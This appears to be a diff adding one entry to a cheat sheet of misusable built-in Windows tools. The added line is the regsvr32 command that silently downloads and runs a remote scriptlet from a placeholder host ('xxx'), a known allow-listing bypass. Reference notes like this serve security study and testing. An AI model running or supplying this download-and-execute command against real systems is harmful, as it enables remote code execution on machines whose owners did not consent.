@@ -590,6 +590,11 @@
       - calls the <entrypoint> function, passing the command line tail which is the <optional arguments>.
       - When the <entrypoint> function returns, Rundll.exe unloads the DLL and exits.
 
+  - regsvr32.exe
+    ```
+    regsvr32.exe /u /n /s /i:http://xxx:80/file.sct scrobj.dll
+    ```
+
   - reg
     ```
     reg query "HKEY_CURRENT_USER\Software\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\Repository\Packages\Microsoft.MicrosoftEdge_40.15063.0.0_neutral__8wekyb3d8bbwe\MicrosoftEdge\Capabilities\FileAssociations" /s
